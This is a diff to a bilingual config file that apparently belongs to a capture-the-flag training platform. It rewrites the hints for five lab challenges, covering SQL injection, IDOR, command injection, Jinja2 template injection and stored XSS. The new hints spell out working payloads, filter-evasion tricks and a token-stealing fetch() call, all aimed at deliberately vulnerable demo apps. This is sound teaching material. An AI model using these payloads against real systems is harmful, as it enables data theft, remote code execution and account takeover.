@@ -5,8 +5,8 @@
       "id": "r01",
       "slug": "mercy-clinic",
       "title": {
-        "en": "The Clinic's Secret Ledger",
-        "id": "Buku Besar Rahasia Klinik"
+        "en": "What Has a Hundred Records but Shows You Only Three?",
+        "id": "Apa yang Punya Seratus Catatan tapi Cuma Menunjukkan Tiga?"
       },
       "app": "Mercy Clinic",
       "category": "SQL injection",
@@ -35,36 +35,36 @@
       "needsBot": false,
       "themeId": "mercy-clinic",
       "scenario": {
-        "en": "A small clinic keeps more paper than it shows.",
-        "id": "Sebuah klinik kecil menyimpan lebih banyak kertas daripada yang diperlihatkan."
+        "en": "Mercy Clinic's notice search is very eager to please. A little too eager.",
+        "id": "Pencarian pengumuman Klinik Mercy sangat ingin menyenangkan. Sedikit terlalu ingin."
       },
       "briefing": {
-        "en": "The clinic says staff notes never leave the back room. Read one anyway.",
-        "id": "Klinik mengatakan catatan staf tidak pernah keluar dari ruang belakang. Baca satu juga."
+        "en": "A staff-only secret hides behind the public notices. The search box glues your words straight into its SQL query, so talk to the database yourself and make it hand over what the public should never see.",
+        "id": "Sebuah rahasia khusus staf bersembunyi di balik pengumuman publik. Kolom pencarian menempelkan kata-katamu langsung ke query SQL-nya, jadi ajak bicara database-nya sendiri dan buat ia menyerahkan yang tak boleh dilihat publik."
       },
       "hints": [
         {
           "id": 1,
           "cost": 10,
           "text": {
-            "en": "Answers are easy to find when the question is allowed to speak for itself.",
-            "id": "Jawaban mudah ditemukan bila pertanyaannya dibiarkan berbicara sendiri."
+            "en": "This is SQL injection. The search builds something like ... WHERE title LIKE '%<your text>%'. Type a single quote ' and watch the page break: that means your text has become part of the SQL.",
+            "id": "Ini SQL injection. Pencarian membangun query semacam ... WHERE title LIKE '%<teksmu>%'. Ketik satu tanda kutip ' dan lihat halamannya rusak: artinya teksmu sudah jadi bagian dari SQL."
           }
         },
         {
           "id": 2,
           "cost": 20,
           "text": {
-            "en": "Two shelves share one room: the one the public sees, and the one it does not. The staff shelf has moved; the index knows the new one.",
-            "id": "Dua rak berbagi satu ruangan: yang dilihat publik, dan yang tidak. Rak staf telah pindah; indeks mengetahui yang baru."
+            "en": "Close the string with ') and add your own rows with UNION SELECT. Your UNION needs as many columns as the original query (Common: 3). Staff notices sit in the notices table with visibility='staff'. On Dangerous a filter deletes the first UNION and SELECT once, so hide each word inside itself: ununionion selselectect.",
+            "id": "Tutup string-nya dengan ') lalu tambahkan baris milikmu dengan UNION SELECT. UNION harus punya jumlah kolom yang sama dengan query aslinya (Common: 3). Pengumuman staf ada di tabel notices dengan visibility='staff'. Di Dangerous ada filter yang menghapus UNION dan SELECT pertama sekali saja, jadi sembunyikan kata itu di dalam dirinya: ununionion selselectect."
           }
         },
         {
           "id": 3,
           "cost": 30,
           "text": {
-            "en": "One sweep of the eraser is not a clean page. Hide a word inside its own echo. The token opens the staff room, but the ledger keeps the last page.",
-            "id": "Satu sapuan penghapus bukan halaman bersih. Sembunyikan kata di dalam gaungnya sendiri. Token membuka ruang staf, tetapi buku besar menyimpan halaman terakhir."
+            "en": "End your payload with -- to comment out the rest. Common: ') UNION SELECT id,title,body FROM notices WHERE visibility='staff' -- . Dangerous: read vault_index to learn the vault table and column, then select from that table. Deadly: the query has 4 columns and only shows rows marked 'public', so UNION the token from staff_tokens with 'public' as the 4th column, then open /staff/notices?token=<token> and the ledger record it names.",
+            "id": "Akhiri payload dengan -- agar sisa query jadi komentar. Common: ') UNION SELECT id,title,body FROM notices WHERE visibility='staff' -- . Dangerous: baca vault_index untuk tahu nama tabel dan kolom brankas, lalu select dari tabel itu. Deadly: query punya 4 kolom dan hanya menampilkan baris bertanda 'public', jadi UNION token dari staff_tokens dengan 'public' di kolom ke-4, lalu buka /staff/notices?token=<token> dan catatan ledger yang disebutkannya."
           }
         }
       ],
@@ -75,8 +75,8 @@
       "id": "r02",
       "slug": "courier",
       "title": {
-        "en": "The Courier Never Asks",
-        "id": "Kurir yang Tak Pernah Bertanya"
+        "en": "Whose Parcel Is It, Anyway?",
+        "id": "Ini Paket Siapa Sih?"
       },
       "app": "Courier",
       "category": "Broken access control",
@@ -105,36 +105,36 @@
       "needsBot": false,
       "themeId": "courier",
       "scenario": {
-        "en": "Parcels move; ownership is a rumour.",
-        "id": "Paket berpindah; kepemilikan hanyalah kabar."
+        "en": "A courier portal that checks your ticket at the door, then lets you wander through every warehouse.",
+        "id": "Portal kurir yang memeriksa tiketmu di pintu, lalu membiarkanmu keliling ke semua gudang."
       },
       "briefing": {
-        "en": "A parcel in the vault is not yours. Read its private note.",
-        "id": "Sebuah paket di brankas bukan milikmu. Baca catatan pribadinya."
+        "en": "Your parcels are numbered 2xxx. The vault's parcels are 1xxx, and they carry private notes. The courier never asks whose parcel you are opening, so open one that is not yours and read what it says.",
+        "id": "Paket milikmu bernomor 2xxx. Paket brankas bernomor 1xxx dan berisi catatan pribadi. Kurirnya tidak pernah bertanya paket siapa yang kamu buka, jadi buka paket yang bukan milikmu dan baca isinya."
       },
       "hints": [
         {
           "id": 1,
           "cost": 10,
           "text": {
-            "en": "You carry a name, but the door asks only for a number.",
-            "id": "Kau membawa nama, tetapi pintu hanya meminta angka."
+            "en": "This is broken access control (an IDOR). Get a demo session with POST /api/session, then call the parcel API with the header Authorization: Bearer <token>. Notice the parcel is chosen only by the number in the URL.",
+            "id": "Ini broken access control (IDOR). Ambil sesi demo dengan POST /api/session, lalu panggil API paket dengan header Authorization: Bearer <token>. Perhatikan paket dipilih hanya dari angka di URL."
           }
         },
         {
           "id": 2,
           "cost": 20,
           "text": {
-            "en": "The parcel is yours; the label is the road it forgets to guard. The old note has moved; the label keeps its own copy.",
-            "id": "Paket itu milikmu; label adalah jalan yang lupa dijaga. Catatan lama telah pindah; label menyimpan salinannya sendiri."
+            "en": "Change the number to someone else's parcel: the vault uses 1000 to 1010. Common: GET /api/parcels/<id> shows the private note. Dangerous: the detail route now checks the owner, but the printable label route GET /api/parcels/<id>/label was forgotten.",
+            "id": "Ganti angkanya ke paket orang lain: brankas memakai 1000 sampai 1010. Common: GET /api/parcels/<id> menampilkan catatan pribadinya. Dangerous: rute detail sekarang mengecek pemilik, tapi rute label cetak GET /api/parcels/<id>/label terlupakan."
           }
         },
         {
           "id": 3,
           "cost": 30,
           "text": {
-            "en": "A key handed out by the wrong desk opens the wrong vault. Inside, the manifest is the page the vault forgot to hide.",
-            "id": "Kunci dari meja yang salah membuka brankas yang salah. Di dalam, manifes adalah halaman yang lupa disembunyikan brankas."
+            "en": "Deadly: the support desk talks too much. GET /api/support/customers/vault returns the vault customer's API key and parcel list. Call GET /api/parcels/<id> with your Bearer token plus the header x-api-key: <key>. The flag is in the manifest field, not in the note.",
+            "id": "Deadly: meja support terlalu banyak bicara. GET /api/support/customers/vault mengembalikan API key dan daftar paket pelanggan brankas. Panggil GET /api/parcels/<id> dengan token Bearer-mu ditambah header x-api-key: <key>. Flag ada di field manifest, bukan di note."
           }
         }
       ],
@@ -145,8 +145,8 @@
       "id": "r03",
       "slug": "beacon",
       "title": {
-        "en": "Whisper to the Watchtower",
-        "id": "Bisikan ke Menara Suar"
+        "en": "Which Lighthouse Obeys Every Whisper?",
+        "id": "Mercusuar Mana yang Menuruti Setiap Bisikan?"
       },
       "app": "Beacon",
       "category": "Command injection",
@@ -175,36 +175,36 @@
       "needsBot": false,
       "themeId": "beacon",
       "scenario": {
-        "en": "A router with a voice.",
-        "id": "Sebuah router yang punya suara."
+        "en": "Beacon is a network box that pings any host you name, and happily runs whatever you sneak in after the name.",
+        "id": "Beacon adalah kotak jaringan yang mem-ping host apa pun yang kamu sebut, dan dengan senang hati menjalankan apa saja yang kamu selipkan setelahnya."
       },
       "briefing": {
-        "en": "The appliance will run a diagnostic for anyone. Make it say more than it means to.",
-        "id": "Perangkat itu mau menjalankan diagnostik untuk siapa saja. Buat ia berkata lebih dari yang seharusnya."
+        "en": "The diagnostics page hands your host straight to a shell. Smuggle in a command of your own and make the appliance read its secret file out loud.",
+        "id": "Halaman diagnostik menyerahkan host-mu langsung ke shell. Selundupkan perintahmu sendiri dan buat perangkat itu membacakan file rahasianya."
       },
       "hints": [
         {
           "id": 1,
           "cost": 10,
           "text": {
-            "en": "The machine listens for a name and hears a sentence.",
-            "id": "Mesin mendengar sebuah nama, lalu mendengar sebuah kalimat."
+            "en": "This is command injection. The host field is placed into a shell command such as ping -c 1 <host>. Characters a shell treats specially (; & | and $( )) let you start a second command after the ping.",
+            "id": "Ini command injection. Isi kolom host dimasukkan ke perintah shell seperti ping -c 1 <host>. Karakter yang spesial bagi shell (; & | dan $( )) memungkinkanmu menjalankan perintah kedua setelah ping."
           }
         },
         {
           "id": 2,
           "cost": 20,
           "text": {
-            "en": "Some letters are forbidden, but a whisper can wear a disguise. The old note is gone; the spool keeps its pieces, and not every piece belongs to the same letter.",
-            "id": "Sebagian huruf dilarang, tetapi bisikan bisa menyamar. Catatan lama telah pergi; gelendong menyimpan potongannya, dan tidak setiap potongan berasal dari surat yang sama."
+            "en": "Common: host=; cat /tmp/beacon/flag.txt # (the # hides the rest of the line). Dangerous: ; & | and backticks are blocked, but $( ) still works. Use $(ls /tmp/beacon/spool) to list the files, then $(cat <file1> <file2>) to read them. The flag is split into a part-1 and a part-2 file; only one pair forms a real flag.",
+            "id": "Common: host=; cat /tmp/beacon/flag.txt # (tanda # menyembunyikan sisa baris). Dangerous: ; & | dan backtick diblokir, tapi $( ) masih bisa. Pakai $(ls /tmp/beacon/spool) untuk melihat file, lalu $(cat <file1> <file2>) untuk membacanya. Flag dipecah jadi file part-1 dan part-2; hanya satu pasang yang membentuk flag asli."
           }
         },
         {
           "id": 3,
           "cost": 30,
           "text": {
-            "en": "The probe is watched; the note it leaves behind is not. Do not knock at the old door — the audit folder files its pages in a deeper room.",
-            "id": "Probe diawasi; catatan yang ditinggalkannya tidak. Jangan ketuk pintu lama — folder audit menyimpan halamannya di ruang yang lebih dalam."
+            "en": "Deadly: the host is now checked strictly, but the free-text label is saved and later pasted into a shell by GET /diagnostics/report. That is second-order injection. Save label=$(ls -R /tmp/beacon/audit) with a valid host, open the report, then save a label that cats the two parts and open the report again.",
+            "id": "Deadly: host sekarang dicek ketat, tapi label teks bebas disimpan lalu nanti ditempel ke shell oleh GET /diagnostics/report. Ini second-order injection. Simpan label=$(ls -R /tmp/beacon/audit) dengan host yang valid, buka report-nya, lalu simpan label yang meng-cat kedua bagian dan buka report lagi."
           }
         }
       ],
@@ -215,8 +215,8 @@
       "id": "r04",
       "slug": "postcard",
       "title": {
-        "en": "The Ink That Writes Back",
-        "id": "Tinta yang Membalas Tulisan"
+        "en": "What Card Writes Back When You Write to It?",
+        "id": "Kartu Apa yang Membalas Saat Kamu Menulisinya?"
       },
       "app": "Postcard",
       "category": "Template injection",
@@ -245,36 +245,36 @@
       "needsBot": false,
       "themeId": "postcard",
       "scenario": {
-        "en": "A studio that prints what it is told.",
-        "id": "Sebuah studio yang mencetak apa yang diperintahkan."
+        "en": "Postcard prints your greeting with the Jinja2 template engine, and treats your message as part of the template.",
+        "id": "Postcard mencetak ucapanmu dengan template engine Jinja2, dan menganggap pesanmu sebagai bagian dari template."
       },
       "briefing": {
-        "en": "The press renders every message. Ask it to read a file it should not.",
-        "id": "Mesin cetak merender setiap pesan. Minta ia membaca berkas yang seharusnya tidak."
+        "en": "Write a card that the press runs instead of prints, then use it to read the flag file on the server.",
+        "id": "Tulis kartu yang dijalankan mesin cetak alih-alih dicetak, lalu gunakan untuk membaca file flag di server."
       },
       "hints": [
         {
           "id": 1,
           "cost": 15,
           "text": {
-            "en": "A card is a mirror: what you write may be read as a spell.",
-            "id": "Kartu adalah cermin: yang kau tulis bisa dibaca sebagai mantra."
+            "en": "This is server-side template injection (Jinja2). Put {{7*7}} in the message: if the card shows 49, your text is being run as a template, not printed as text.",
+            "id": "Ini server-side template injection (Jinja2). Tulis {{7*7}} di pesan: kalau kartunya menampilkan 49, teksmu dijalankan sebagai template, bukan dicetak sebagai teks."
           }
         },
         {
           "id": 2,
           "cost": 30,
           "text": {
-            "en": "A list of forbidden words is a fence with a gap; spell around it. The old proof is not on the front table; the outbox keeps its pieces in pairs.",
-            "id": "Daftar kata terlarang adalah pagar bercelah; eja di sekitarnya. Bukti lama tidak ada di meja depan; kotak keluar menyimpan potongannya berpasangan."
+            "en": "A template can reach Python's os module: {{ config.__class__.__init__.__globals__.os.popen('cat /tmp/postcard/flag.txt').read() }}. Dangerous blocks __, os, popen and import, so build them from pieces: {% set d='_'~'_' %} and config|attr(d~'cla'~'ss'~d), 'o'~'s'. There the flag is split into part-1 and part-2 files in /tmp/postcard/outbox/.",
+            "id": "Template bisa menjangkau modul os milik Python: {{ config.__class__.__init__.__globals__.os.popen('cat /tmp/postcard/flag.txt').read() }}. Dangerous memblokir __, os, popen dan import, jadi susun dari potongan: {% set d='_'~'_' %} dan config|attr(d~'cla'~'ss'~d), 'o'~'s'. Di sana flag dipecah jadi file part-1 dan part-2 di /tmp/postcard/outbox/."
           }
         },
         {
           "id": 3,
           "cost": 45,
           "text": {
-            "en": "The curtain is closed in the studio, but the press still prints what it is given. The archive is a deeper room; only the print stage can read it.",
-            "id": "Tirai ditutup di studio, tetapi mesin cetak tetap mencetak yang diberikan. Arsip adalah ruang yang lebih dalam; hanya tahap cetak yang bisa membacanya."
+            "en": "Deadly: /preview no longer renders your message. It saves a draft (look for data-draft in the page) and the print page GET /orders/<draft>/print renders it. Send your payload through /preview, open the print page, list /tmp/postcard/archive with ls -R, then cat the two parts the same way.",
+            "id": "Deadly: /preview tidak lagi merender pesanmu. Ia menyimpan draf (cari data-draft di halaman) dan halaman cetak GET /orders/<draft>/print yang merendernya. Kirim payload lewat /preview, buka halaman cetaknya, tampilkan isi /tmp/postcard/archive dengan ls -R, lalu cat kedua bagiannya dengan cara yang sama."
           }
         }
       ],
@@ -285,8 +285,8 @@
       "id": "r05",
       "slug": "binanse",
       "title": {
-        "en": "The Dragon Hoard Heist",
-        "id": "Perampokan Peti Harta Naga"
+        "en": "Who Reads Your Complaint and Hands You the Vault?",
+        "id": "Siapa yang Membaca Keluhanmu lalu Menyerahkan Brankas?"
       },
       "app": "Binanse",
       "category": "Stored XSS",
@@ -312,36 +312,36 @@
       "needsBot": false,
       "themeId": "binanse",
       "scenario": {
-        "en": "A crypto exchange where complaints are read by the people who hold the keys.",
-        "id": "Bursa kripto tempat keluhan dibaca oleh orang-orang yang memegang kunci."
+        "en": "Binanse is a very secure crypto exchange (they told us so). Its DevOps engineer reads every support ticket in a browser full of staff secrets.",
+        "id": "Binanse adalah bursa kripto yang sangat aman (kata mereka sendiri). Engineer DevOps-nya membaca setiap tiket support di browser yang penuh rahasia staf."
       },
       "briefing": {
-        "en": "Binanse's support queue is read by its DevOps engineer. Take a seat that is not yours, open the vault, and send the cold ledger to your own address.",
-        "id": "Antrean dukungan Binanse dibaca oleh engineer DevOps-nya. Duduki kursi yang bukan milikmu, buka brankas, dan kirim buku besar dingin ke alamatmu sendiri."
+        "en": "Register, file a ticket that runs JavaScript in the DevOps engineer's browser, steal the staff session, and move the whole vault into your own wallet. The transfer receipt holds the flag.",
+        "id": "Daftar, kirim tiket yang menjalankan JavaScript di browser engineer DevOps, curi sesi stafnya, lalu pindahkan seluruh isi brankas ke dompetmu sendiri. Struk transfernya memuat flag."
       },
       "hints": [
         {
           "id": 1,
           "cost": 15,
           "text": {
-            "en": "A complaint is a letter; letters are read by someone with keys.",
-            "id": "Keluhan adalah surat; surat dibaca oleh seseorang yang memegang kunci."
+            "en": "This is stored XSS. Register, then write a support ticket: its body is stored raw and shown to staff. A payload such as <img src=x onerror=...> runs when the DevOps engineer opens it, and POST /tickets/<id>/review asks them to.",
+            "id": "Ini stored XSS. Daftar, lalu tulis tiket support: isinya disimpan mentah dan ditampilkan ke staf. Payload seperti <img src=x onerror=...> berjalan saat engineer DevOps membukanya, dan POST /tickets/<id>/review memintanya untuk membuka."
           }
         },
         {
           "id": 2,
           "cost": 30,
           "text": {
-            "en": "The reader's hands remember what the page forgets to hide. A picture can carry a whisper.",
-            "id": "Tangan pembaca mengingat apa yang lupa disembunyikan halaman. Sebuah gambar bisa membawa bisikan."
+            "en": "The engineer's browser keeps the staff token in localStorage.bn_staff_token. Make your payload send it to the public inbox: fetch('/api/attacker/inbox',{method:'POST',body:localStorage.getItem('bn_staff_token')}). Read it at /attacker, then sign in at /staff/login with that token.",
+            "id": "Browser engineer itu menyimpan token staf di localStorage.bn_staff_token. Buat payload-mu mengirimnya ke kotak masuk publik: fetch('/api/attacker/inbox',{method:'POST',body:localStorage.getItem('bn_staff_token')}). Baca di /attacker, lalu masuk di /staff/login dengan token itu."
           }
         },
         {
           "id": 3,
           "cost": 45,
           "text": {
-            "en": "The vault opens in two turns: first the name of a stranger, then the number only the keeper knows.",
-            "id": "Brankas terbuka dalam dua putaran: dulu nama orang asing, lalu angka yang hanya diketahui penjaga."
+            "en": "As staff, the withdrawal PIN is on /staff/settings and the vault balance on /staff. Whitelist your own wallet (bn1..., shown on your dashboard) with POST /staff/whitelist, then POST /staff/transfer with your address, the PIN and the whole balance. The receipt shows the flag.",
+            "id": "Sebagai staf, PIN penarikan ada di /staff/settings dan saldo brankas di /staff. Masukkan dompetmu (bn1..., terlihat di dashboard) ke whitelist dengan POST /staff/whitelist, lalu POST /staff/transfer dengan alamatmu, PIN dan seluruh saldo. Struknya menampilkan flag."
           }
         }
       ],
